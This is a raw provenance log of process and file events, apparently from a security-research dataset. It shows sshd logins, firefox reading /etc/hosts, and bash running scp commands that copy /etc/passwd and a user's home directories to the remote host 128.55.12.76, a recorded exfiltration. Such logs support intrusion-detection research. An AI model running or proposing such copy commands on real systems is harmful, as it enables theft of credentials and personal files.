1557417249.817:855156252,44C6CAF4-5702-EFD2-D609-261CC877E3D2:firefox,READ,573E5010-1713-BD2C-2998-A48580BDA4D4,/etc/hosts,ta1-trace-2
1557417249.817:855156247,D26E8E7A-9473-2FD3-EDD2-AD19713C899E:firefox,READ,573E5010-1713-BD2C-2998-A48580BDA4D4,/etc/hosts,ta1-trace-2
1557417249.817:855156246,D26E8E7A-9473-2FD3-EDD2-AD19713C899E:firefox,READ,573E5010-1713-BD2C-2998-A48580BDA4D4,/etc/hosts,ta1-trace-2
1557417249.817:855156237,7A807E1E-855F-C0A6-DC39-06C9935B6F20:firefox,READ,573E5010-1713-BD2C-2998-A48580BDA4D4,/etc/hosts,ta1-trace-2
1557417249.817:855156236,7A807E1E-855F-C0A6-DC39-06C9935B6F20:firefox,READ,573E5010-1713-BD2C-2998-A48580BDA4D4,/etc/hosts,ta1-trace-2
1557417241.816:855142413,44C6CAF4-5702-EFD2-D609-261CC877E3D2:firefox,READ,573E5010-1713-BD2C-2998-A48580BDA4D4,/etc/hosts,ta1-trace-2
1557417241.816:855142412,44C6CAF4-5702-EFD2-D609-261CC877E3D2:firefox,READ,573E5010-1713-BD2C-2998-A48580BDA4D4,/etc/hosts,ta1-trace-2
1557417241.816:855142399,D26E8E7A-9473-2FD3-EDD2-AD19713C899E:firefox,READ,573E5010-1713-BD2C-2998-A48580BDA4D4,/etc/hosts,ta1-trace-2
1557417241.816:855142398,D26E8E7A-9473-2FD3-EDD2-AD19713C899E:firefox,READ,573E5010-1713-BD2C-2998-A48580BDA4D4,/etc/hosts,ta1-trace-2
1557417241.816:855142393,7A807E1E-855F-C0A6-DC39-06C9935B6F20:firefox,READ,573E5010-1713-BD2C-2998-A48580BDA4D4,/etc/hosts,ta1-trace-2
1557417241.816:855142391,7A807E1E-855F-C0A6-DC39-06C9935B6F20:firefox,READ,573E5010-1713-BD2C-2998-A48580BDA4D4,/etc/hosts,ta1-trace-2
1557417240.816:855139533,FD5AED61-06E4-1A18-CA51-0A40A0D9C88C:Socket Thread,READ,573E5010-1713-BD2C-2998-A48580BDA4D4,/etc/hosts,ta1-trace-2
1557417240.816:855139532,FD5AED61-06E4-1A18-CA51-0A40A0D9C88C:Socket Thread,READ,573E5010-1713-BD2C-2998-A48580BDA4D4,/etc/hosts,ta1-trace-2
1557417236.088:855120103,E35513AC-BFB4-0B5E-AF48-E301FAEDEB87:sshd,MMAP,D14FEB4F-4BA2-0D59-2F20-1A07938FE879,/etc/passwd,ta1-trace-2
1557417236.088:855120025,E35513AC-BFB4-0B5E-AF48-E301FAEDEB87:sshd,MMAP,D14FEB4F-4BA2-0D59-2F20-1A07938FE879,/etc/passwd,ta1-trace-2
1557417236.088:855119940,857E8394-55F1-CF4D-8C7C-78855706A7B7:sshd,CHANGE_PRINCIPAL,E35513AC-BFB4-0B5E-AF48-E301FAEDEB87,sshd,ta1-trace-2
1557417236.088:855119939,857E8394-55F1-CF4D-8C7C-78855706A7B7:sshd,CHANGE_PRINCIPAL,857E8394-55F1-CF4D-8C7C-78855706A7B7,sshd,ta1-trace-2
1557417236.088:855119938,E35513AC-BFB4-0B5E-AF48-E301FAEDEB87:sshd,CHANGE_PRINCIPAL,857E8394-55F1-CF4D-8C7C-78855706A7B7,sshd,ta1-trace-2
1557417235.976:855118141,20DD83DE-FF87-C969-D0AE-768F51BC1318:firefox,READ,573E5010-1713-BD2C-2998-A48580BDA4D4,/etc/hosts,ta1-trace-2
1557417235.976:855118139,20DD83DE-FF87-C969-D0AE-768F51BC1318:firefox,READ,573E5010-1713-BD2C-2998-A48580BDA4D4,/etc/hosts,ta1-trace-2
1557417235.968:855118104,FE72B124-4916-F65E-8BA7-F369F5643F59:firefox,READ,573E5010-1713-BD2C-2998-A48580BDA4D4,/etc/hosts,ta1-trace-2
1557417235.968:855118101,FE72B124-4916-F65E-8BA7-F369F5643F59:firefox,READ,573E5010-1713-BD2C-2998-A48580BDA4D4,/etc/hosts,ta1-trace-2
1557417235.960:855118019,20DD83DE-FF87-C969-D0AE-768F51BC1318:firefox,READ,573E5010-1713-BD2C-2998-A48580BDA4D4,/etc/hosts,ta1-trace-2
1557417235.960:855118018,20DD83DE-FF87-C969-D0AE-768F51BC1318:firefox,READ,573E5010-1713-BD2C-2998-A48580BDA4D4,/etc/hosts,ta1-trace-2
1557417235.940:855117890,FE72B124-4916-F65E-8BA7-F369F5643F59:firefox,READ,573E5010-1713-BD2C-2998-A48580BDA4D4,/etc/hosts,ta1-trace-2
1557417235.940:855117886,FE72B124-4916-F65E-8BA7-F369F5643F59:firefox,READ,573E5010-1713-BD2C-2998-A48580BDA4D4,/etc/hosts,ta1-trace-2
1557417235.932:855117793,20DD83DE-FF87-C969-D0AE-768F51BC1318:firefox,READ,573E5010-1713-BD2C-2998-A48580BDA4D4,/etc/hosts,ta1-trace-2
1557417235.932:855117791,20DD83DE-FF87-C969-D0AE-768F51BC1318:firefox,READ,573E5010-1713-BD2C-2998-A48580BDA4D4,/etc/hosts,ta1-trace-2
1557417235.924:855117690,FE72B124-4916-F65E-8BA7-F369F5643F59:firefox,READ,573E5010-1713-BD2C-2998-A48580BDA4D4,/etc/hosts,ta1-trace-2
1557417235.924:855117689,FE72B124-4916-F65E-8BA7-F369F5643F59:firefox,READ,573E5010-1713-BD2C-2998-A48580BDA4D4,/etc/hosts,ta1-trace-2
1557417235.924:855117624,20DD83DE-FF87-C969-D0AE-768F51BC1318:firefox,READ,573E5010-1713-BD2C-2998-A48580BDA4D4,/etc/hosts,ta1-trace-2
1557417235.924:855117620,20DD83DE-FF87-C969-D0AE-768F51BC1318:firefox,READ,573E5010-1713-BD2C-2998-A48580BDA4D4,/etc/hosts,ta1-trace-2
1557417235.920:855117515,FE72B124-4916-F65E-8BA7-F369F5643F59:firefox,READ,573E5010-1713-BD2C-2998-A48580BDA4D4,/etc/hosts,ta1-trace-2
1557417235.920:855117510,FE72B124-4916-F65E-8BA7-F369F5643F59:firefox,READ,573E5010-1713-BD2C-2998-A48580BDA4D4,/etc/hosts,ta1-trace-2
1557417235.920:855117335,20DD83DE-FF87-C969-D0AE-768F51BC1318:firefox,READ,573E5010-1713-BD2C-2998-A48580BDA4D4,/etc/hosts,ta1-trace-2
1557417235.920:855117334,20DD83DE-FF87-C969-D0AE-768F51BC1318:firefox,READ,573E5010-1713-BD2C-2998-A48580BDA4D4,/etc/hosts,ta1-trace-2
1557417234.968:855113722,8A59A48F-CF10-E4B0-CD6E-644C53C2EB63:scp,READ,D14FEB4F-4BA2-0D59-2F20-1A07938FE879,/etc/passwd,ta1-trace-2
1557417234.292:855112262,966C6168-93F6-BE67-D9A2-43AF223D32CD:ssh,MMAP,D14FEB4F-4BA2-0D59-2F20-1A07938FE879,/etc/passwd,ta1-trace-2
1557417234.292:855112259,966C6168-93F6-BE67-D9A2-43AF223D32CD:ssh,MMAP,D14FEB4F-4BA2-0D59-2F20-1A07938FE879,/etc/passwd,ta1-trace-2
1557417234.292:855112256,966C6168-93F6-BE67-D9A2-43AF223D32CD:ssh,MMAP,D14FEB4F-4BA2-0D59-2F20-1A07938FE879,/etc/passwd,ta1-trace-2
1557417234.292:855112253,966C6168-93F6-BE67-D9A2-43AF223D32CD:ssh,MMAP,D14FEB4F-4BA2-0D59-2F20-1A07938FE879,/etc/passwd,ta1-trace-2
1557417234.292:855112250,966C6168-93F6-BE67-D9A2-43AF223D32CD:ssh,MMAP,D14FEB4F-4BA2-0D59-2F20-1A07938FE879,/etc/passwd,ta1-trace-2
1557417234.292:855112247,966C6168-93F6-BE67-D9A2-43AF223D32CD:ssh,MMAP,D14FEB4F-4BA2-0D59-2F20-1A07938FE879,/etc/passwd,ta1-trace-2
1557417234.292:855112244,966C6168-93F6-BE67-D9A2-43AF223D32CD:ssh,MMAP,D14FEB4F-4BA2-0D59-2F20-1A07938FE879,/etc/passwd,ta1-trace-2
1557417234.292:855112222,966C6168-93F6-BE67-D9A2-43AF223D32CD:ssh,MMAP,D14FEB4F-4BA2-0D59-2F20-1A07938FE879,/etc/passwd,ta1-trace-2
1557417234.292:855112127,689043F9-561E-70E0-DDBD-6F1BFFC9D045:scp,EXECUTE,966C6168-93F6-BE67-D9A2-43AF223D32CD,ssh,ta1-trace-2
1557417234.292:855112118,8A59A48F-CF10-E4B0-CD6E-644C53C2EB63:scp,FORK,689043F9-561E-70E0-DDBD-6F1BFFC9D045,scp,ta1-trace-2
1557417234.292:855112111,8A59A48F-CF10-E4B0-CD6E-644C53C2EB63:scp,MMAP,D14FEB4F-4BA2-0D59-2F20-1A07938FE879,/etc/passwd,ta1-trace-2
1557417234.288:855112050,B2E1D1E2-0BC9-FDA5-A971-BA526C7174FD:bash,EXECUTE,8A59A48F-CF10-E4B0-CD6E-644C53C2EB63,b'scp -r /etc/passwd admin@128.55.12.76:\\C:UsersadminDocuments',ta1-trace-2
1557417234.288:855112044,C9983C63-B664-289D-0E67-09D9E7CF5992:bash,FORK,B2E1D1E2-0BC9-FDA5-A971-BA526C7174FD,bash,ta1-trace-2
1557417233.840:855110750,FE72B124-4916-F65E-8BA7-F369F5643F59:firefox,READ,573E5010-1713-BD2C-2998-A48580BDA4D4,/etc/hosts,ta1-trace-2
1557417233.840:855110747,FE72B124-4916-F65E-8BA7-F369F5643F59:firefox,READ,573E5010-1713-BD2C-2998-A48580BDA4D4,/etc/hosts,ta1-trace-2
1557417233.812:855110536,44C6CAF4-5702-EFD2-D609-261CC877E3D2:firefox,READ,573E5010-1713-BD2C-2998-A48580BDA4D4,/etc/hosts,ta1-trace-2
1557417233.812:855110535,44C6CAF4-5702-EFD2-D609-261CC877E3D2:firefox,READ,573E5010-1713-BD2C-2998-A48580BDA4D4,/etc/hosts,ta1-trace-2
1557417233.812:855110527,D26E8E7A-9473-2FD3-EDD2-AD19713C899E:firefox,READ,573E5010-1713-BD2C-2998-A48580BDA4D4,/etc/hosts,ta1-trace-2
1557417233.812:855110526,D26E8E7A-9473-2FD3-EDD2-AD19713C899E:firefox,READ,573E5010-1713-BD2C-2998-A48580BDA4D4,/etc/hosts,ta1-trace-2
1557417233.812:855110517,7A807E1E-855F-C0A6-DC39-06C9935B6F20:firefox,READ,573E5010-1713-BD2C-2998-A48580BDA4D4,/etc/hosts,ta1-trace-2
1557417233.812:855110516,7A807E1E-855F-C0A6-DC39-06C9935B6F20:firefox,READ,573E5010-1713-BD2C-2998-A48580BDA4D4,/etc/hosts,ta1-trace-2
1557417233.800:855110370,20DD83DE-FF87-C969-D0AE-768F51BC1318:firefox,READ,573E5010-1713-BD2C-2998-A48580BDA4D4,/etc/hosts,ta1-trace-2
1557417233.800:855110368,20DD83DE-FF87-C969-D0AE-768F51BC1318:firefox,READ,573E5010-1713-BD2C-2998-A48580BDA4D4,/etc/hosts,ta1-trace-2
1557417233.696:855107107,FD5AED61-06E4-1A18-CA51-0A40A0D9C88C:Socket Thread,READ,573E5010-1713-BD2C-2998-A48580BDA4D4,/etc/hosts,ta1-trace-2
1557417233.696:855107106,FD5AED61-06E4-1A18-CA51-0A40A0D9C88C:Socket Thread,READ,573E5010-1713-BD2C-2998-A48580BDA4D4,/etc/hosts,ta1-trace-2
1557417231.812:855105795,1CDC643C-A4FD-56F9-C233-81858E77A429:firefox,READ,573E5010-1713-BD2C-2998-A48580BDA4D4,/etc/hosts,ta1-trace-2
1557417231.812:855105794,1CDC643C-A4FD-56F9-C233-81858E77A429:firefox,READ,573E5010-1713-BD2C-2998-A48580BDA4D4,/etc/hosts,ta1-trace-2
1557417230.816:855102953,2AED1CF1-8145-8329-CCE9-9817DA73208A:firefox,READ,573E5010-1713-BD2C-2998-A48580BDA4D4,/etc/hosts,ta1-trace-2
1557417230.816:855102952,2AED1CF1-8145-8329-CCE9-9817DA73208A:firefox,READ,573E5010-1713-BD2C-2998-A48580BDA4D4,/etc/hosts,ta1-trace-2
1557417226.816:855089629,FE72B124-4916-F65E-8BA7-F369F5643F59:firefox,READ,573E5010-1713-BD2C-2998-A48580BDA4D4,/etc/hosts,ta1-trace-2
1557417226.816:855089627,FE72B124-4916-F65E-8BA7-F369F5643F59:firefox,READ,573E5010-1713-BD2C-2998-A48580BDA4D4,/etc/hosts,ta1-trace-2
1557417225.816:855083278,44C6CAF4-5702-EFD2-D609-261CC877E3D2:firefox,READ,573E5010-1713-BD2C-2998-A48580BDA4D4,/etc/hosts,ta1-trace-2
1557417225.816:855083276,44C6CAF4-5702-EFD2-D609-261CC877E3D2:firefox,READ,573E5010-1713-BD2C-2998-A48580BDA4D4,/etc/hosts,ta1-trace-2
1557417225.816:855083272,D26E8E7A-9473-2FD3-EDD2-AD19713C899E:firefox,READ,573E5010-1713-BD2C-2998-A48580BDA4D4,/etc/hosts,ta1-trace-2
1557417225.816:855083270,D26E8E7A-9473-2FD3-EDD2-AD19713C899E:firefox,READ,573E5010-1713-BD2C-2998-A48580BDA4D4,/etc/hosts,ta1-trace-2
1557417225.816:855083259,7A807E1E-855F-C0A6-DC39-06C9935B6F20:firefox,READ,573E5010-1713-BD2C-2998-A48580BDA4D4,/etc/hosts,ta1-trace-2
1557417225.816:855083255,7A807E1E-855F-C0A6-DC39-06C9935B6F20:firefox,READ,573E5010-1713-BD2C-2998-A48580BDA4D4,/etc/hosts,ta1-trace-2
1557417224.708:855074641,FD5AED61-06E4-1A18-CA51-0A40A0D9C88C:Socket Thread,READ,573E5010-1713-BD2C-2998-A48580BDA4D4,/etc/hosts,ta1-trace-2
1557417224.708:855074640,FD5AED61-06E4-1A18-CA51-0A40A0D9C88C:Socket Thread,READ,573E5010-1713-BD2C-2998-A48580BDA4D4,/etc/hosts,ta1-trace-2
1557417224.708:855074520,20DD83DE-FF87-C969-D0AE-768F51BC1318:firefox,READ,573E5010-1713-BD2C-2998-A48580BDA4D4,/etc/hosts,ta1-trace-2
1557417224.708:855074518,20DD83DE-FF87-C969-D0AE-768F51BC1318:firefox,READ,573E5010-1713-BD2C-2998-A48580BDA4D4,/etc/hosts,ta1-trace-2
1557417224.692:855073800,FD5AED61-06E4-1A18-CA51-0A40A0D9C88C:Socket Thread,READ,573E5010-1713-BD2C-2998-A48580BDA4D4,/etc/hosts,ta1-trace-2
1557417224.692:855073798,FD5AED61-06E4-1A18-CA51-0A40A0D9C88C:Socket Thread,READ,573E5010-1713-BD2C-2998-A48580BDA4D4,/etc/hosts,ta1-trace-2
1557417224.692:855073770,20DD83DE-FF87-C969-D0AE-768F51BC1318:firefox,READ,573E5010-1713-BD2C-2998-A48580BDA4D4,/etc/hosts,ta1-trace-2
1557417224.692:855073766,20DD83DE-FF87-C969-D0AE-768F51BC1318:firefox,READ,573E5010-1713-BD2C-2998-A48580BDA4D4,/etc/hosts,ta1-trace-2
1557417224.676:855073258,20DD83DE-FF87-C969-D0AE-768F51BC1318:firefox,READ,573E5010-1713-BD2C-2998-A48580BDA4D4,/etc/hosts,ta1-trace-2
1557417224.676:855073257,20DD83DE-FF87-C969-D0AE-768F51BC1318:firefox,READ,573E5010-1713-BD2C-2998-A48580BDA4D4,/etc/hosts,ta1-trace-2
1557417224.676:855073235,20DD83DE-FF87-C969-D0AE-768F51BC1318:firefox,READ,573E5010-1713-BD2C-2998-A48580BDA4D4,/etc/hosts,ta1-trace-2
1557417224.676:855073232,20DD83DE-FF87-C969-D0AE-768F51BC1318:firefox,READ,573E5010-1713-BD2C-2998-A48580BDA4D4,/etc/hosts,ta1-trace-2
1557417224.660:855072646,20DD83DE-FF87-C969-D0AE-768F51BC1318:firefox,READ,573E5010-1713-BD2C-2998-A48580BDA4D4,/etc/hosts,ta1-trace-2
1557417224.660:855072638,20DD83DE-FF87-C969-D0AE-768F51BC1318:firefox,READ,573E5010-1713-BD2C-2998-A48580BDA4D4,/etc/hosts,ta1-trace-2
1557417224.644:855072184,1CDC643C-A4FD-56F9-C233-81858E77A429:firefox,READ,573E5010-1713-BD2C-2998-A48580BDA4D4,/etc/hosts,ta1-trace-2
1557417224.644:855072183,1CDC643C-A4FD-56F9-C233-81858E77A429:firefox,READ,573E5010-1713-BD2C-2998-A48580BDA4D4,/etc/hosts,ta1-trace-2
1557417222.828:855061474,2AED1CF1-8145-8329-CCE9-9817DA73208A:firefox,READ,573E5010-1713-BD2C-2998-A48580BDA4D4,/etc/hosts,ta1-trace-2
1557417222.828:855061472,2AED1CF1-8145-8329-CCE9-9817DA73208A:firefox,READ,573E5010-1713-BD2C-2998-A48580BDA4D4,/etc/hosts,ta1-trace-2
1557417218.812:855044913,FE72B124-4916-F65E-8BA7-F369F5643F59:firefox,READ,573E5010-1713-BD2C-2998-A48580BDA4D4,/etc/hosts,ta1-trace-2
1557417218.812:855044912,FE72B124-4916-F65E-8BA7-F369F5643F59:firefox,READ,573E5010-1713-BD2C-2998-A48580BDA4D4,/etc/hosts,ta1-trace-2
1557417217.812:855043249,44C6CAF4-5702-EFD2-D609-261CC877E3D2:firefox,READ,573E5010-1713-BD2C-2998-A48580BDA4D4,/etc/hosts,ta1-trace-2
1557417217.812:855043248,44C6CAF4-5702-EFD2-D609-261CC877E3D2:firefox,READ,573E5010-1713-BD2C-2998-A48580BDA4D4,/etc/hosts,ta1-trace-2
1557417217.812:855043242,D26E8E7A-9473-2FD3-EDD2-AD19713C899E:firefox,READ,573E5010-1713-BD2C-2998-A48580BDA4D4,/etc/hosts,ta1-trace-2
1557417217.812:855043238,D26E8E7A-9473-2FD3-EDD2-AD19713C899E:firefox,READ,573E5010-1713-BD2C-2998-A48580BDA4D4,/etc/hosts,ta1-trace-2
1557417217.812:855043232,7A807E1E-855F-C0A6-DC39-06C9935B6F20:firefox,READ,573E5010-1713-BD2C-2998-A48580BDA4D4,/etc/hosts,ta1-trace-2
1557417217.812:855043231,7A807E1E-855F-C0A6-DC39-06C9935B6F20:firefox,READ,573E5010-1713-BD2C-2998-A48580BDA4D4,/etc/hosts,ta1-trace-2
1557417210.812:855025080,2AED1CF1-8145-8329-CCE9-9817DA73208A:firefox,READ,573E5010-1713-BD2C-2998-A48580BDA4D4,/etc/hosts,ta1-trace-2
1557417210.812:855025076,2AED1CF1-8145-8329-CCE9-9817DA73208A:firefox,READ,573E5010-1713-BD2C-2998-A48580BDA4D4,/etc/hosts,ta1-trace-2
1557417209.816:855024151,44C6CAF4-5702-EFD2-D609-261CC877E3D2:firefox,READ,573E5010-1713-BD2C-2998-A48580BDA4D4,/etc/hosts,ta1-trace-2
1557417209.816:855024150,44C6CAF4-5702-EFD2-D609-261CC877E3D2:firefox,READ,573E5010-1713-BD2C-2998-A48580BDA4D4,/etc/hosts,ta1-trace-2
1557417209.816:855024139,D26E8E7A-9473-2FD3-EDD2-AD19713C899E:firefox,READ,573E5010-1713-BD2C-2998-A48580BDA4D4,/etc/hosts,ta1-trace-2
1557417209.816:855024138,D26E8E7A-9473-2FD3-EDD2-AD19713C899E:firefox,READ,573E5010-1713-BD2C-2998-A48580BDA4D4,/etc/hosts,ta1-trace-2
1557417209.816:855024127,7A807E1E-855F-C0A6-DC39-06C9935B6F20:firefox,READ,573E5010-1713-BD2C-2998-A48580BDA4D4,/etc/hosts,ta1-trace-2
1557417209.816:855024125,7A807E1E-855F-C0A6-DC39-06C9935B6F20:firefox,READ,573E5010-1713-BD2C-2998-A48580BDA4D4,/etc/hosts,ta1-trace-2
1557417203.916:855004107,65A05B91-0894-7411-5040-5DE4D73E9A95:ssh,MMAP,D14FEB4F-4BA2-0D59-2F20-1A07938FE879,/etc/passwd,ta1-trace-2
1557417203.916:855004104,65A05B91-0894-7411-5040-5DE4D73E9A95:ssh,MMAP,D14FEB4F-4BA2-0D59-2F20-1A07938FE879,/etc/passwd,ta1-trace-2
1557417203.916:855004101,65A05B91-0894-7411-5040-5DE4D73E9A95:ssh,MMAP,D14FEB4F-4BA2-0D59-2F20-1A07938FE879,/etc/passwd,ta1-trace-2
1557417203.916:855004098,65A05B91-0894-7411-5040-5DE4D73E9A95:ssh,MMAP,D14FEB4F-4BA2-0D59-2F20-1A07938FE879,/etc/passwd,ta1-trace-2
1557417203.916:855004095,65A05B91-0894-7411-5040-5DE4D73E9A95:ssh,MMAP,D14FEB4F-4BA2-0D59-2F20-1A07938FE879,/etc/passwd,ta1-trace-2
1557417203.916:855004092,65A05B91-0894-7411-5040-5DE4D73E9A95:ssh,MMAP,D14FEB4F-4BA2-0D59-2F20-1A07938FE879,/etc/passwd,ta1-trace-2
1557417203.916:855004089,65A05B91-0894-7411-5040-5DE4D73E9A95:ssh,MMAP,D14FEB4F-4BA2-0D59-2F20-1A07938FE879,/etc/passwd,ta1-trace-2
1557417203.912:855004067,65A05B91-0894-7411-5040-5DE4D73E9A95:ssh,MMAP,D14FEB4F-4BA2-0D59-2F20-1A07938FE879,/etc/passwd,ta1-trace-2
1557417203.908:855003972,F4981A4F-D48F-8516-5448-29CB24C26341:scp,EXECUTE,65A05B91-0894-7411-5040-5DE4D73E9A95,ssh,ta1-trace-2
1557417203.908:855003963,9FEB3223-D52B-AB1A-1C92-E9B9A2B166DA:scp,FORK,F4981A4F-D48F-8516-5448-29CB24C26341,scp,ta1-trace-2
1557417203.908:855003956,9FEB3223-D52B-AB1A-1C92-E9B9A2B166DA:scp,MMAP,D14FEB4F-4BA2-0D59-2F20-1A07938FE879,/etc/passwd,ta1-trace-2
1557417203.908:855003895,5ADBB12C-B417-BF98-0C7C-EA7C60413DC1:bash,EXECUTE,9FEB3223-D52B-AB1A-1C92-E9B9A2B166DA,b'scp -r /home/admin/backup /home/admin/corporales /home/admin/Desktop /home/admin/docs /home/admin/Documents /home/admin/Downloads /home/admin/files /home/admin/gagtooth /home/admin/glx_alsa_675.ko /home/admin/grains /home/admin/hosts /home/admin/hsperfdata_darpa /home/admin/hyporhined /home/admin/ichthyodian /home/admin/insalivation /home/admin/jna-95354950 /home/admin/minion /home/admin/Music /home/admin/mytest /home/admin/nodeexporter /home/admin/out857 /home/admin/out864 /home/admin/passwd /home/admin/Pictures /home/admin/Public /home/admin/Templates /home/admin/test /home/admin/Videos /home/admin/work /home/admin/xvnc4viewer.deb admin@128.55.12.76:.',ta1-trace-2
1557417203.908:855003889,C9983C63-B664-289D-0E67-09D9E7CF5992:bash,FORK,5ADBB12C-B417-BF98-0C7C-EA7C60413DC1,bash,ta1-trace-2
1557417203.720:855000889,C9983C63-B664-289D-0E67-09D9E7CF5992:bash,MMAP,D14FEB4F-4BA2-0D59-2F20-1A07938FE879,/etc/passwd,ta1-trace-2
1557417203.720:855000803,706617F5-9AC8-A593-451D-8754F69CDD7E:sshd,EXECUTE,C9983C63-B664-289D-0E67-09D9E7CF5992,bash,ta1-trace-2
1557417203.720:855000690,F864D8BB-C9A7-81C7-A617-7FE73E7E1686:sshd,FORK,706617F5-9AC8-A593-451D-8754F69CDD7E,sshd,ta1-trace-2
1557417203.716:855000644,E35513AC-BFB4-0B5E-AF48-E301FAEDEB87:sshd,MMAP,D14FEB4F-4BA2-0D59-2F20-1A07938FE879,/etc/passwd,ta1-trace-2
1557417203.716:855000638,E35513AC-BFB4-0B5E-AF48-E301FAEDEB87:sshd,MMAP,D14FEB4F-4BA2-0D59-2F20-1A07938FE879,/etc/passwd,ta1-trace-2
1557417203.716:855000618,D02CFB0B-0326-9659-9277-300A4BBB23BC:sshd,CHANGE_PRINCIPAL,F864D8BB-C9A7-81C7-A617-7FE73E7E1686,sshd,ta1-trace-2
1557417203.716:855000596,FBB392D0-A1E6-5C42-FEC6-B8C6AF8AD716:sshd,CHANGE_PRINCIPAL,D02CFB0B-0326-9659-9277-300A4BBB23BC,sshd,ta1-trace-2
1557417203.716:855000593,E35513AC-BFB4-0B5E-AF48-E301FAEDEB87:sshd,FORK,FBB392D0-A1E6-5C42-FEC6-B8C6AF8AD716,sshd,ta1-trace-2
1557417203.716:855000584,E35513AC-BFB4-0B5E-AF48-E301FAEDEB87:sshd,MMAP,D14FEB4F-4BA2-0D59-2F20-1A07938FE879,/etc/passwd,ta1-trace-2
1557417203.716:855000548,E35513AC-BFB4-0B5E-AF48-E301FAEDEB87:sshd,MMAP,D14FEB4F-4BA2-0D59-2F20-1A07938FE879,/etc/passwd,ta1-trace-2
1557417203.716:855000545,E35513AC-BFB4-0B5E-AF48-E301FAEDEB87:sshd,MMAP,D14FEB4F-4BA2-0D59-2F20-1A07938FE879,/etc/passwd,ta1-trace-2
1557417203.716:855000542,E35513AC-BFB4-0B5E-AF48-E301FAEDEB87:sshd,MMAP,D14FEB4F-4BA2-0D59-2F20-1A07938FE879,/etc/passwd,ta1-trace-2
1557417203.716:855000466,C99430D4-C9E8-C13A-0C17-B9C4F425667C:update-motd-fsc,EXECUTE,DF753498-FF17-4812-769B-D7B1942E1EB8,cat,ta1-trace-2
1557417203.716:855000464,A3511370-6032-5633-4E58-685D6A55F4D2:update-motd-fsc,FORK,C99430D4-C9E8-C13A-0C17-B9C4F425667C,update-motd-fsc,ta1-trace-2
1557417203.712:855000249,FE23283F-9E24-ED6D-28E5-97E91F99BE8C:98-fsck-at-rebo,EXECUTE,A3511370-6032-5633-4E58-685D6A55F4D2,update-motd-fsc,ta1-trace-2
1557417203.712:855000227,F69A2276-4071-FA4D-77C1-9D7845F8BE87:run-parts,EXECUTE,FE23283F-9E24-ED6D-28E5-97E91F99BE8C,98-fsck-at-rebo,ta1-trace-2
1557417203.712:855000226,85CC1260-EAB7-BE5B-6313-FFB6C60BCB52:run-parts,FORK,F69A2276-4071-FA4D-77C1-9D7845F8BE87,run-parts,ta1-trace-2
1557417203.712:855000177,DB5F449D-D1F7-414C-AA94-E5E06A20A499:update-motd-hwe,EXECUTE,E384078E-274F-5D0D-B578-AC2022F742B7,cat,ta1-trace-2
1557417203.712:855000175,7059349D-D32A-654C-199A-0930CF6E5261:update-motd-hwe,FORK,DB5F449D-D1F7-414C-AA94-E5E06A20A499,update-motd-hwe,ta1-trace-2
1557417203.688:854998822,D68F589F-3B77-610C-D6DA-1FD484E5DF87:95-hwe-eol,EXECUTE,7059349D-D32A-654C-199A-0930CF6E5261,update-motd-hwe,ta1-trace-2
1557417203.688:854998791,31311401-52DF-96D9-A5DB-0533B631C194:run-parts,EXECUTE,D68F589F-3B77-610C-D6DA-1FD484E5DF87,95-hwe-eol,ta1-trace-2
1557417203.688:854998790,85CC1260-EAB7-BE5B-6313-FFB6C60BCB52:run-parts,FORK,31311401-52DF-96D9-A5DB-0533B631C194,run-parts,ta1-trace-2
1557417203.680:854998554,2AED1CF1-8145-8329-CCE9-9817DA73208A:firefox,READ,573E5010-1713-BD2C-2998-A48580BDA4D4,/etc/hosts,ta1-trace-2
1557417203.680:854998553,2AED1CF1-8145-8329-CCE9-9817DA73208A:firefox,READ,573E5010-1713-BD2C-2998-A48580BDA4D4,/etc/hosts,ta1-trace-2
1557417203.668:854998397,CBF285AD-50C1-004A-148D-48B533010420:lsb_release,MMAP,D14FEB4F-4BA2-0D59-2F20-1A07938FE879,/etc/passwd,ta1-trace-2
1557417203.660:854998155,7124BB9A-CF09-E518-A342-6F91CA706A99:91-release-upgr,EXECUTE,CBF285AD-50C1-004A-148D-48B533010420,lsb_release,ta1-trace-2
1557417203.660:854998148,1BB8FFFB-9A3E-0231-0C5D-80B8665962DF:91-release-upgr,FORK,7124BB9A-CF09-E518-A342-6F91CA706A99,91-release-upgr,ta1-trace-2
1557417203.660:854998141,2CE09024-BEB8-073E-6FB7-3241005F7F1D:91-release-upgr,FORK,1BB8FFFB-9A3E-0231-0C5D-80B8665962DF,91-release-upgr,ta1-trace-2
1557417203.660:854998119,1ADF8EDD-9C9D-0A25-8082-C1C438E0EB8E:run-parts,EXECUTE,2CE09024-BEB8-073E-6FB7-3241005F7F1D,91-release-upgr,ta1-trace-2
